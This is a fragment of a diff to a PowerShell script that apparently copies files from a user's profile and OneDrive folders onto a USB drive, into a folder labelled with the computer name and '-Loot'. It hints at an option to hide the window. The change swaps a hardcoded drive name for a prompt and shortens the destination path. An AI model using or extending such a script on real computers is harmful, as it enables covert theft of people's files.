@@ -5,7 +5,7 @@ Clear-Host
 
 # Checking and getting the USB drive name if it is not provided
 if($driveName.length -lt 1){
-    $driveName = "Seagate_Storage"  # Changed to Seagate_Storage
+    $driveName = Read-Host "Enter the name of the USB drive "
 }
 
 # Checking if the window should be hidden
@@ -51,7 +51,7 @@ $foldersToSearch = @(
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
 
-$destinationPath = "$driveLetter\Seagate_Storage\$env:COMPUTERNAME-Loot"  # Changed to Seagate_Storage
+$destinationPath = "$driveLetter\$env:COMPUTERNAME-Loot"
 
 # Ensure that the destination folder exists
 if (-not (Test-Path -Path $destinationPath)) {
